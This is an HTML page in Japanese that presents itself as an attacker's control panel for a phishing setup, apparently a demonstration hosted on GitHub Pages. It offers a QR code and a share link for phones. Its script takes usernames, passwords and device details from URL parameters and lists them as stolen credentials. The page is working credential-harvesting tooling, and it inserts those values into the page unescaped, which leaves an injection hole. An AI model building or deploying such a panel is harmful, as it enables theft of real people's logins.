<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>攻撃者ダッシュボード | 管理画面</title>
  <link rel="stylesheet" href="style.css">
</head>
<body class="admin-body">

  <div class="admin-header">
    <h1>🔴 ATTACKER CONTROL PANEL (C&C Server)</h1>
    <div id="connection-status" style="color: #2ed573; font-weight: bold;">🟢 リアルタイム監視中（URL直結モード）</div>
  </div>

  <!-- QRコード用のリンク表示 -->
  <div style="background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; gap: 20px;">
    <img src="aa.png" alt="接続用QRコード" style="width: 100px; height: 100px; background: white; padding: 4px; border-radius: 6px;">
    <div>
      <h3 style="color: #58a6ff; margin-bottom: 5px;">スマホ接続用URL</h3>
      <p style="font-size: 13px; color: #8b949e; margin-bottom: 10px;">スマホでQRコードを読み取ってください。</p>
      <button class="btn-copy" onclick="copyShareUrl()" style="padding: 6px 12px; background: #238636; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">リンクをコピー</button>
    </div>
  </div>

  <div class="stats-card">
    <div style="font-size: 12px; color: #8b949e;">総奪取データ数</div>
    <div class="count-number" id="count">0</div>
  </div>

  <table class="log-table">
    <thead>
      <tr>
        <th>受信時刻</th>
        <th>端末情報</th>
        <th>入力されたID</th>
        <th>奪取されたパスワード</th>
      </tr>
    </thead>
    <tbody id="log-list">
      <tr><td colspan="4" style="text-align:center; color: #8b949e;">スマホからの入力を待機しています...</td></tr>
    </tbody>
  </table>

  <script>
    // GitHub Pagesの自分の管理者画面のURLをベースにする
    const currentAdminUrl = window.location.href.split('?')[0];
    const shareUrl = `index.html?admin=${encodeURIComponent(currentAdminUrl)}`;

    function copyShareUrl() {
      navigator.clipboard.writeText(window.location.origin + window.location.pathname.replace('admin.html', '') + shareUrl).then(() => {
        alert("スマホ用リンクをコピーしました！");
      });
    }

    let logs = [];

    // ページが読み込まれたときに、URLにくっついてきたデータがあるかチェックする
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('username')) {
      const log = {
        time: urlParams.get('time'),
        device: urlParams.get('device'),
        username: urlParams.get('username'),
        password: urlParams.get('password')
      };
      logs.unshift(log);
      renderLogs();
      
      // ステータスを「データ強奪成功」に変更
      document.getElementById('connection-status').innerText = "🔥 被害者からのデータを強奪成功！";
      document.getElementById('connection-status').style.color = "#ff4757";
    }

    function renderLogs() {
      const listContainer = document.getElementById('log-list');
      const countContainer = document.getElementById('count');

      countContainer.innerText = logs.length;
      listContainer.innerHTML = '';

      logs.forEach(log => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${log.time}</td>
          <td><span class="badge">${log.device}</span></td>
          <td class="highlight">${log.username}</td>
          <td class="password-danger">${log.password}</td>
        `;
        listContainer.appendChild(tr);
      });
    }
  </script>
</body>
</html>
